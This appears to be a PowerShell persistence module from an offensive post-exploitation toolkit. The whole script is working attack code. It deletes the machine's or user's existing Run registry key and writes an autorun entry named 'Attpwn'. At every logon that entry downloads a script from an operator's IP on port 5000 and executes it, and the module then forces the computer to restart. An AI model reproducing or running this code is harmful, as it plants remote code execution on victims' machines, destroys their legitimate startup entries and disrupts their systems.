






function invoke-registryrun
    {

    param(
      [String] $ip
    )
     
    

    $uri = "http://" + $ip + ":5000/consola"
    $good = $false
    $results = $null

    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
        {
        if (Test-Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run")
          {
          

          Remove-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Recurse -Force
          Start-Sleep 1
          $results = reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('$uri');consola -id '$global:id'"
          

          

          $results = $results  +  " path : HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
          $good = $true
          }
        else
          {
          $results = reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('$uri');consola -id '$global:id'"
          

          

          $results = $results  +  " path: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
          $good = $true
          }
        }
    else
      {

      if (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run")
        {
        

        Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Recurse -Force
        Start-Sleep 1
        New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Force
        $results = reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('$uri');consola -id '$global:id'"
        

        

        $results = $results  +  " pathpath : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        $good = $true
        }
      else
        {
        $results = reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('$uri');consola -id '$global:id'"
        

        

        $results = $results  +  " path : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        $good = $true
        }

      }

    

    return @{results = $results | Out-String; success = $good }
    }



$execute = {

}




$execute = invoke-registryrun -ip $global:remoteip


  

  


  

if($execute.success)
  {
  start-Job {Restart-Computer -Force}
  }

return @{results=$execute.results;success=$execute.success}
